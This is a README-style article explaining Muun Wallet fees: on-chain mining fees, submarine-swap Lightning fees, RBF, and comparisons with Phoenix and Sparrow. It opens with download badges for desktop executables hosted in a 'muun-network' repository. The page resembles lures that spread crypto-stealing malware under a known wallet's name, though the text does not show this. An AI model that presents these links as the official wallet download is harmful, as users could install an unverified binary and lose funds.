[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)

---

# Muun Wallet Fees Explained

Muun Wallet fees are the most discussed topic about Muun in Bitcoin communities. This article breaks down every cost type in plain terms — what you pay, when you pay it, and why the amount varies.

---

## Fee types in Muun Wallet

There are three distinct cost sources in Muun Wallet Desktop:

**1. On-chain transaction fees (mining fees)**

When you send Bitcoin on-chain, you pay a mining fee to get the transaction included in a block. Muun calculates this from the current Bitcoin mempool — the live queue of unconfirmed transactions — and shows you the expected cost before you confirm. The fee is denominated in satoshis per virtual byte (sat/vB) and scales with network congestion.

Muun's fee estimator is optimized to target next-block confirmation without overpaying for the current network state. You can also choose a lower fee rate if you are willing to wait longer for confirmation.

**2. Lightning payment fees (swap + routing)**

When you send a Lightning payment, Muun does not use native Lightning channels. It performs a submarine swap — an atomic exchange that moves value from your on-chain balance to the Lightning network to fund the payment. This swap involves a Bitcoin on-chain transaction, so the dominant cost is the same on-chain mining fee described above.

Additionally, a small swap service fee applies, which is a percentage of the payment amount. This is typically small relative to the mining fee during congestion.

**3. No holding fees, no subscription**

Muun Wallet does not charge fees for holding Bitcoin, receiving payments, or using the application. There is no monthly subscription and no in-app purchase. The only costs are transaction-related fees described above.

---

## Why fees vary between sends

The Bitcoin mempool changes continuously. A transaction sent during a low-traffic period can cost a fraction of one sent an hour later when a batch of high-value transactions has flooded the mempool. This is not a Muun behaviour — it is how Bitcoin on-chain fees work across every wallet and service that transacts on-chain.

Muun Wallet Desktop makes this variability visible by showing the live estimate before confirmation rather than displaying a fixed rate or disclosing the fee only after the transaction is broadcast.

---

## When Muun fees are highest

Small Lightning payments during peak mempool congestion are the worst case. Because the on-chain swap component has a roughly fixed size regardless of the payment amount, a small payment (a few thousand satoshis) can incur a fee that represents a meaningful percentage of the total. This is the legitimate criticism of Muun's Lightning fee model and is documented honestly by the project itself.

During high-congestion periods, large on-chain or Lightning sends are proportionally much more efficient — the fee is similar in absolute terms but small relative to the amount.

---

## When Muun fees are competitive

During low-congestion periods — typically weekends, overnight periods in Western time zones, and quiet mempool windows — Muun's Lightning fees can be lower than the routing fees on native-channel Lightning wallets. The swap is cheap when blocks are not contested, and the swap service fee is small enough that the total can undercut many native routing paths.

For on-chain sends, Muun's mempool-based estimator consistently targets efficient fee rates rather than conservative overestimates, which saves cost compared to wallets that use static or overly conservative fee tables.

---

## Checking the fee before you send

Every send flow in Muun Wallet Desktop shows the estimated fee before you confirm. Read this number before proceeding. If it looks higher than expected, that is current mempool congestion — not a bug. You can choose to cancel and retry when congestion is lower.

The fee history view in Muun Wallet Desktop also lets you review what you have paid over time, which helps you identify patterns in when fees are highest versus lowest for your own usage.

---

## Fixing stuck transactions with RBF

If you send a transaction at a low fee and the mempool moves up before it is confirmed, the transaction may stall. Muun Wallet Desktop's replace-by-fee (RBF) feature lets you bump the fee on a pending transaction to get it confirmed faster. See the [stuck transaction guide](muun-wallet-stuck-transaction-rbf.md) for the step-by-step process.

---

## Comparing Muun fees to alternatives

If fee predictability for small Lightning payments is your primary concern, Phoenix Wallet's native channel model produces more stable Lightning fees during congestion periods. If you want maximum on-chain fee control, Sparrow Wallet offers manual UTXO selection and custom fee rate input. The [Lightning wallets comparison](best-bitcoin-lightning-wallets-2026.md) and [Muun vs Phoenix](muun-wallet-vs-phoenix-wallet.md) cover these trade-offs in detail.

For the full context on how the swap model drives Muun's fee behavior, see [Lightning fees explained](muun-wallet-lightning-fees-explained.md) and [what is a submarine swap](what-is-a-submarine-swap.md).

---

## Related articles

- [Muun Wallet Lightning fees explained](muun-wallet-lightning-fees-explained.md)
- [What is a submarine swap?](what-is-a-submarine-swap.md)
- [How to fix a stuck transaction in Muun Wallet (RBF)](muun-wallet-stuck-transaction-rbf.md)
- [Muun Wallet vs Phoenix Wallet](muun-wallet-vs-phoenix-wallet.md)
- [Muun Wallet review 2026](muun-wallet-review-2026.md)
